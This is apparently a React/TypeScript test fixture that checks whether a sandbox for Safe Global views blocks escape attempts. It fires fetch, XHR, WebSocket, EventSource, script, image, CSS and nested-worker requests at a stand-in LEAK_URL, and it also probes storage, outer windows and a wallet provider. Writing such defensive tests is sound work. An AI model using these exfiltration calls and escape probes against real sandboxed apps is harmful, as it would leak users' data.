import { createElement, useEffect } from 'react'
import CookieBannerActions from '@safe-global/views/components/common/CookieAndTermBanner/CookieBannerActions'

declare const LEAK_URL: string

type Report = (name: string, result: string) => void

const attempt = async (report: Report, name: string, fn: () => unknown) => {
  try {
    await fn()
    report(name, 'ESCAPED')
  } catch (error) {
    report(name, `blocked: ${String((error as Error)?.message ?? error).slice(0, 80)}`)
  }
}

const settle = (target: object, open: string) =>
  new Promise((resolve, reject) => {
    Object.assign(target, { [open]: resolve, onerror: () => reject(new Error('connection failed')) })
  })

// Each attack tries to reach something a view must never have. Network attacks also hit LEAK_URL,
// whose server log the runner checks, so a request that leaves the sandbox is caught even if it "fails".
const ATTACKS: Record<string, () => unknown> = {
  fetch: () => fetch(`${LEAK_URL}/fetch`),
  XMLHttpRequest: () => {
    const xhr = new XMLHttpRequest()
    xhr.open('GET', `${LEAK_URL}/xhr`)
    xhr.send()
    return settle(xhr, 'onload')
  },
  WebSocket: () => settle(new WebSocket(`${LEAK_URL.replace('http', 'ws')}/ws`), 'onopen'),
  EventSource: () => settle(new EventSource(`${LEAK_URL}/eventsource`), 'onopen'),
  importScripts: () =>
    (self as unknown as { importScripts: (url: string) => void }).importScripts(`${LEAK_URL}/script`),
  indexedDB: () => settle(indexedDB.open('steal'), 'onsuccess'),
  caches: () => caches.open('steal'),
  'a real window': () => {
    const scope = self as unknown as Record<string, { fetch?: unknown } | undefined>
    const real = ['window', 'parent', 'top', 'opener'].filter((key) => typeof scope[key]?.fetch === 'function')
    if (!real.length) throw new Error('only stand-ins without fetch')
  },
  'wallet provider': () => {
    if (!('ethereum' in self)) throw new Error('not present')
  },
  'nested worker': () => {
    new Worker(URL.createObjectURL(new Blob([`fetch('${LEAK_URL}/nested-worker')`])))
    throw new Error('started; its request is checked in the leak server log')
  },
}

export const AttackView = ({ report }: { report: Report }) => {
  useEffect(() => {
    for (const [name, fn] of Object.entries(ATTACKS)) attempt(report, name, fn)
  }, [report])

  return createElement(
    'div',
    { className: 'p-2' },
    createElement('img', { src: `${LEAK_URL}/img` }),
    createElement('a', { href: `${LEAK_URL}/phishing` }, 'phishing link'),
    createElement('div', { style: { backgroundImage: `url(${LEAK_URL}/css)` }, className: 'styled' }, 'styled div'),
    createElement('script', { src: `${LEAK_URL}/script-tag` }),
    createElement(CookieBannerActions, {
      onAccept: () => report('callback', 'onAccept called'),
      onAcceptAll: () => report('callback', 'onAcceptAll called'),
    }),
  )
}
